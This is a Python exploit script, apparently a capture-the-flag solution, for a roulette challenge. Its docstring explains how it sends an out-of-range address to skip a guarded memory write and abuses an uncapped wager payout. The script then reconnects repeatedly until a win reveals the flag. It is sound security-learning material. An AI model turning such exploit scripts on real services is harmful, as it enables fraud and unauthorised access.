#!/usr/bin/env python3
"""online-roulette -- skip the write primitive entirely, then out-wager the house.

main() calls win() when `balance > 999999999`, and balance starts at 10.
game() offers one arbitrary single-byte write, but guards it with

    if (addr > (uintptr_t)&wager) { puts("intruder neutralised"); }
    else { ... *(unsigned char *)addr = value; }

`balance` lives in main's frame, i.e. at a *higher* address than game's
`wager`, so the write can never reach it.  But the guard's else-branch is the
only thing that dereferences `addr`: feeding a huge address takes the
"neutralised" path and skips the write, which is exactly what we want -- no
crash, no need to leak a single stack address.

The real bug is in the payout:

    *balance -= wager;                 // 10 - w
    if (lotto == 1) *balance += 2 * w; // 10 - w + 2w = 10 + w

There is no cap on `wager` beyond `wager > 0`, so one win with w = 1e9 leaves
balance = 1000000010 > 999999999.  A loss drives balance negative and ends the
round, so each connection is a single 1-in-36 roll -- just reconnect until it
lands.
"""
import os
import re
import socket
import sys

HOST = os.environ.get("ROULETTE_HOST", "chal.secso.cc")
PORT = int(os.environ.get("ROULETTE_PORT", "4000"))
WAGER = 1_000_000_000
ATTEMPTS = int(os.environ.get("ROULETTE_TRIES", "200"))


def attempt():
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(6)
    try:
        # name length, then the poisoned-address prompt we deliberately fail,
        # then the wager, then quit, then the name.
        s.sendall(b"20\n" + b"ffffffffffffffff\n" + f"{WAGER}\n".encode()
                  + b"0\n" + b"aaaa\n")
        out = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
        return out
    except socket.timeout:
        return b""
    finally:
        s.close()


for i in range(1, ATTEMPTS + 1):
    out = attempt()
    if b"intruder neutralised" not in out and i == 1:
        sys.exit("[-] unexpected: write guard did not trigger\n" + out.decode(errors="replace"))
    m = re.search(rb"(K17\{[^}]*\}|SCONES\{[^}]*\})", out)
    if m:
        print(f"[+] won on attempt {i}")
        print("[+] FLAG:", m.group(1).decode())
        break
    if b"u r the goat" in out:
        print(f"[!] attempt {i}: reached win() but no flag in output")
        print(out.decode(errors="replace"))
        break
    if i % 20 == 0:
        print(f"[*] {i} attempts, still losing")
else:
    sys.exit(f"[-] no win in {ATTEMPTS} attempts")
